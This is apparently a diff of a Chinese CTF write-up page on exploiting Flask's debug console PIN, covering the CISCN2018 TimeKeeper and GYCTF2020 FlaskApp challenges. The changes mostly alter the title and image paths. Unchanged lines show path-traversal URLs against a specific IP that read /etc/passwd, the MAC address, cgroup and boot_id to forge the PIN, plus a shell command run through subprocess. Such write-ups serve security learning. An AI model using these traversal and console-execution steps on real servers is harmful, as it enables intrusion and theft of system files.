@@ -5,7 +5,7 @@
     <meta charset="UTF-8" />
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
     <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Flask debug PIN命令执行漏洞/CISCN2018：final-TimeKeeper/GYCTF2020-FlaskApp - H3ng</title>
+    <title>Flask debug PIN命令执行漏洞/CISCN2018：final-TimeKeeper/GYCTF2020：FlaskApp - H3ng</title>
     <meta name="apple-mobile-web-app-capable" content="yes" />
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
     <meta name="google" content="notranslate" />
@@ -34,7 +34,7 @@ Flask在生产环境中开启debug模式是一件非常危险的事，主要有3
     <div class="bar" style="width: 0;"></div>
     <a class="iconfont icon-home image-icon" href="javascript:;" data-url="http://LXH3ng.github.io"></a>
     <div title="播放/暂停" class="iconfont icon-play"></div>
-    <h3 class="subtitle">Flask debug PIN命令执行漏洞/CISCN2018：final-TimeKeeper/GYCTF2020-FlaskApp</h3>
+    <h3 class="subtitle">Flask debug PIN命令执行漏洞/CISCN2018：final-TimeKeeper/GYCTF2020：FlaskApp</h3>
     <div class="social">
         <div>
             <div class="share">
@@ -49,7 +49,7 @@ Flask在生产环境中开启debug模式是一件非常危险的事，主要有3
     <div class="section">
         <div class="article">
     <div class='main'>
-        <h1 class="title">Flask debug PIN命令执行漏洞/CISCN2018：final-TimeKeeper/GYCTF2020-FlaskApp</h1>
+        <h1 class="title">Flask debug PIN命令执行漏洞/CISCN2018：final-TimeKeeper/GYCTF2020：FlaskApp</h1>
         <div class="stuff">
             <span>十一月 11, 2021</span>
             
@@ -253,38 +253,38 @@ app <span class="token operator">=</span> Flask<span class="token punctuation">(
 <p>“return Hello”存在错误这里的hello未被定义，“debug=True”开启调试模式</p>
 </li>
 <li><p>部署到环境中</p>
-<p><img src="/Flask-debug-PIN%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-CISCN2018%EF%BC%9Afinal-TimeKeeper-GYCTF2020-FlaskApp.assets/image-20211111145529828.png" alt="image-20211111145529828"></p>
+<p><img src="/2021/11/11/flask-debug-pin-ming-ling-zhi-xing-lou-dong-ciscn2018-final-timekeeper-gyctf2020-flaskapp/image-20211111145529828.png" alt="image-20211111145529828"></p>
 <p>由于代码存在错误会进入debug</p>
-<p><img src="/Flask-debug-PIN%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-CISCN2018%EF%BC%9Afinal-TimeKeeper-GYCTF2020-FlaskApp.assets/image-20211111145659650.png" alt="image-20211111145659650"></p>
+<p><img src="/2021/11/11/flask-debug-pin-ming-ling-zhi-xing-lou-dong-ciscn2018-final-timekeeper-gyctf2020-flaskapp/image-20211111145659650.png" alt="image-20211111145659650"></p>
 <p>可以看到解释器和应用路径</p>
 <p>console中输入pin</p>
-<p><img src="/Flask-debug-PIN%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-CISCN2018%EF%BC%9Afinal-TimeKeeper-GYCTF2020-FlaskApp.assets/image-20211111150227938.png" alt="image-20211111150227938"></p>
+<p><img src="/2021/11/11/flask-debug-pin-ming-ling-zhi-xing-lou-dong-ciscn2018-final-timekeeper-gyctf2020-flaskapp/image-20211111150227938.png" alt="image-20211111150227938"></p>
 <p>都未执行成功</p>
 <p>后面的没能完成采用文章截图吧</p>
-<p><img src="/Flask-debug-PIN%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-CISCN2018%EF%BC%9Afinal-TimeKeeper-GYCTF2020-FlaskApp.assets/image-20211111150209244.png" alt="image-20211111150209244"></p>
+<p><img src="/2021/11/11/flask-debug-pin-ming-ling-zhi-xing-lou-dong-ciscn2018-final-timekeeper-gyctf2020-flaskapp/image-20211111150209244.png" alt="image-20211111150209244"></p>
 </li>
 </ol>
 <h2 id="后记："><a href="#后记：" class="headerlink" title="后记："></a>后记：</h2><p>在kali中跑出来了</p>
 <pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> subprocess <span class="token keyword">import</span> check_output
 
 check_output<span class="token punctuation">(</span><span class="token string">'ifconfig'</span><span class="token punctuation">,</span>shell<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span></code></pre>
-<p><img src="/Flask-debug-PIN%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-CISCN2018%EF%BC%9Afinal-TimeKeeper-GYCTF2020-FlaskApp.assets/image-20211111174707599.png" alt="image-20211111174707599"></p>
-<h1 id="CISCN2018：final-TimeKeeper"><a href="#CISCN2018：final-TimeKeeper" class="headerlink" title="CISCN2018：final-TimeKeeper"></a>CISCN2018：final-TimeKeeper</h1><p><img src="/Flask-debug-PIN%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-CISCN2018%EF%BC%9Afinal-TimeKeeper-GYCTF2020-FlaskApp.assets/image-20211111124738927.png" alt="image-20211111124738927"></p>
+<p><img src="/2021/11/11/flask-debug-pin-ming-ling-zhi-xing-lou-dong-ciscn2018-final-timekeeper-gyctf2020-flaskapp/image-20211111174707599.png" alt="image-20211111174707599"></p>
+<h1 id="CISCN2018：final-TimeKeeper"><a href="#CISCN2018：final-TimeKeeper" class="headerlink" title="CISCN2018：final-TimeKeeper"></a>CISCN2018：final-TimeKeeper</h1><p><img src="/2021/11/11/flask-debug-pin-ming-ling-zhi-xing-lou-dong-ciscn2018-final-timekeeper-gyctf2020-flaskapp/image-20211111124738927.png" alt="image-20211111124738927"></p>
 <p>发现/console</p>
-<p><img src="/Flask-debug-PIN%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-CISCN2018%EF%BC%9Afinal-TimeKeeper-GYCTF2020-FlaskApp.assets/image-20211111124829534.png" alt="image-20211111124829534"></p>
+<p><img src="/2021/11/11/flask-debug-pin-ming-ling-zhi-xing-lou-dong-ciscn2018-final-timekeeper-gyctf2020-flaskapp/image-20211111124829534.png" alt="image-20211111124829534"></p>
 <p>输错价格和id进入python debug</p>
-<p><img src="/Flask-debug-PIN%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-CISCN2018%EF%BC%9Afinal-TimeKeeper-GYCTF2020-FlaskApp.assets/image-20211111125158901.png" alt="image-20211111125158901"></p>
+<p><img src="/2021/11/11/flask-debug-pin-ming-ling-zhi-xing-lou-dong-ciscn2018-final-timekeeper-gyctf2020-flaskapp/image-20211111125158901.png" alt="image-20211111125158901"></p>
 <p>获取flask目录下的一个app.py的绝对路径</p>
 <pre><code>/usr/local/lib/python2.7/dist-packages/flask/app.py</code></pre>
 <pre><code>http://111.200.241.244:49355/asserts/..%2f..%2f..%2f..%2f/etc/passwd</code></pre>
-<p><img src="/Flask-debug-PIN%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-CISCN2018%EF%BC%9Afinal-TimeKeeper-GYCTF2020-FlaskApp.assets/image-20211111130049191.png" alt="image-20211111130049191"></p>
+<p><img src="/2021/11/11/flask-debug-pin-ming-ling-zhi-xing-lou-dong-ciscn2018-final-timekeeper-gyctf2020-flaskapp/image-20211111130049191.png" alt="image-20211111130049191"></p>
 <p>root和ctf可用</p>
 <pre><code>http://111.200.241.244:49355/asserts/..%2f..%2f..%2f..%2f/sys/class/net/eth0/address</code></pre>
 <p>02:d9:d4:24:40:16</p>
 <p>转换为十进制</p>
 <p>3134590304278</p>
 <pre><code>http://111.200.241.244:49355/asserts/..%2f..%2f..%2f..%2f/proc/self/cgroup</code></pre>
-<p><img src="/Flask-debug-PIN%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-CISCN2018%EF%BC%9Afinal-TimeKeeper-GYCTF2020-FlaskApp.assets/image-20211111130245290.png" alt="image-20211111130245290"></p>
+<p><img src="/2021/11/11/flask-debug-pin-ming-ling-zhi-xing-lou-dong-ciscn2018-final-timekeeper-gyctf2020-flaskapp/image-20211111130245290.png" alt="image-20211111130245290"></p>
 <pre><code>9c53f2ee41ea353b18b583926197cd776487bfab3058a8f319734dc65e71d302</code></pre>
 <pre><code>http://111.200.241.244:49355/asserts/..%2f..%2f..%2f..%2f/proc/sys/kernel/random/boot_id</code></pre>
 <pre><code>012c0db1-a401-4a82-b781-03d7681c398e</code></pre>
